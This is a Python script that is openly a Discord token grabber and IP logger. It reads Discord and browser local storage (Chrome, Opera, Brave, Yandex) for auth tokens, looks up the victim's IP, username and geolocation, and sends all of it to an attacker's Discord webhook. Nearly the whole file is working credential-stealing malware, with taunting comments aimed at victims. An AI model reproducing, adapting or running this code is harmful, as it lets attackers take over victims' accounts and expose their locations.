import requests
from requests import get
import socket
import logging, json
import os
from datetime import date
import datetime
import time
from discord_webhook import DiscordWebhook, DiscordEmbed
import re
from urllib.request import Request, urlopen
import socket
from pathlib import Path
import ctypes
import urllib.request

cool = 'https://api.ipify.org/'
output = requests.get(cool).text
webhook = DiscordWebhook(url='WEBHOOK HERE')
embed = DiscordEmbed(title='IT WORKED!', description=output, color=0x0000FF)
embed.set_author(name='pogchamp', url='https://github.com/MattyTM', icon_url='https://screenshots.gamebanana.com/img/ico/sprays/58f11d50c3c07.png')
embed.set_footer(text='pogger')
embed.set_timestamp()
webhook.add_embed(embed)
response = webhook.execute()

hostname = socket.gethostname()

IPAddr = socket.gethostbyname(hostname)

pcname = os.getenv('username')

token_grabber = True
ip_grabber_f = True
today = date.today()

ext = {"webhook-id": "WEBHOOK HERE", "webhook-name": "poggers"}

os.system('TITLE OF THE APP')

def ip_grabber():
    webhook = DiscordWebhook(url=ext['webhook-id'], content=f" ```User IP Address: {IPAddr}```",  username=ext['webhook-name'])
    webhook.execute()

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone we got em' if True else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    webhook = DiscordWebhook(url=ext['webhook-id'], content=message,  username=ext['webhook-name'])
    webhook.execute()

if token_grabber is True:
    main()
if ip_grabber_f is True:
    ip_grabber()


webhook = DiscordWebhook(url=ext['webhook-id'], content=f" ```Pc name: {pcname}```", username=ext['webhook-name'])
webhook.execute()

publicip = get('https://api.ipify.org').text
city = get(f'https://ipapi.co/{publicip}/city').text
region = get(f'https://ipapi.co/{publicip}/region').text
postal = get(f'https://ipapi.co/{publicip}/postal').text
timezone = get(f'https://ipapi.co/{publicip}/timezone').text

webhook = DiscordWebhook(url=ext['webhook-id'], content=f"```city: {city}```", username=ext['webhook-name'])
webhook.execute()
webhook = DiscordWebhook(url=ext['webhook-id'], content=f"```region: {region}```", username=ext['webhook-name'])
webhook.execute()
webhook = DiscordWebhook(url=ext['webhook-id'], content=f"```postal: {postal}```", username=ext['webhook-name'])
webhook.execute()
webhook = DiscordWebhook(url=ext['webhook-id'], content=f"```timezone: {timezone}```", username=ext['webhook-name'])
webhook.execute()

#you just got ezed


